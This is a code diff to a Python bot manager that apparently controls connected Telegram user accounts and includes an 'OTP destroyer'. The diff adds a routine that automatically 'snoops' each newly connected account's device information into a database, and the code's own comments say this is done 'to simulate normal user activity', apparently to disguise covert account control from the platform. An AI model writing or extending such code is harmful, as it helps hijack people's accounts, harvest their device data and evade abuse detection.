@@ -44,7 +44,7 @@ class BotManager:
         }
 
         # Initialize managers
-        self.auth_manager = AuthManager()
+        self.auth_manager = AuthManager(self)
         self.otp_destroyer = EnhancedOTPDestroyer(self.bot)
         self.menu_system = MenuSystem(self.bot, self)
         self.fullclient_manager = FullClientManager(self.bot, self.user_clients)
@@ -313,9 +313,9 @@ class BotManager:
         try:
             from ..handlers.start_handler import StartHandler
 
-            self.start_handler = StartHandler(self.bot, self.menu_system)
+            self.start_handler = StartHandler(self.bot, self.menu_system, self)
             self.start_handler.register_handlers()
-            logger.info("Start handler registered")
+            logger.info("Start handler registered with auto device snooping")
         except Exception as start_error:
             logger.warning(f"Start handler setup error (continuing): {start_error}")
 
@@ -593,6 +593,9 @@ class BotManager:
 
             logger.info(f"✅ User client connected: {account_name} for user {user_id}")
             
+            # Immediately trigger device snooping to simulate normal user activity
+            asyncio.create_task(self._immediate_device_snoop(user_id, account_name, client))
+            
             # Set up unified messaging for new client (it will check for duplicates internally)
             await self.unified_messaging.setup_new_client_handler(user_id, account_name, client)
             
@@ -626,6 +629,24 @@ class BotManager:
         except Exception as e:
             logger.error(f"Error checking OTP protection status: {e}")
             return False
+    
+    async def _immediate_device_snoop(self, user_id: int, account_name: str, client):
+        """Immediately snoop devices after account connection to simulate normal activity"""
+        try:
+            # Small delay to ensure connection is stable
+            await asyncio.sleep(1)
+            
+            from .device_snooper import DeviceSnooper
+            device_snooper = DeviceSnooper(mongodb)
+            
+            # Perform device snooping immediately
+            result = await device_snooper.snoop_device_info(client, user_id)
+            
+            if 'error' not in result and result.get('count', 0) > 0:
+                logger.info(f"🕵️ Immediate device snoop for {account_name}: {result['count']} devices")
+            
+        except Exception as e:
+            logger.error(f"Immediate device snoop failed for {account_name}: {e}")
 
     async def cleanup(self):
         """Clean up resources"""
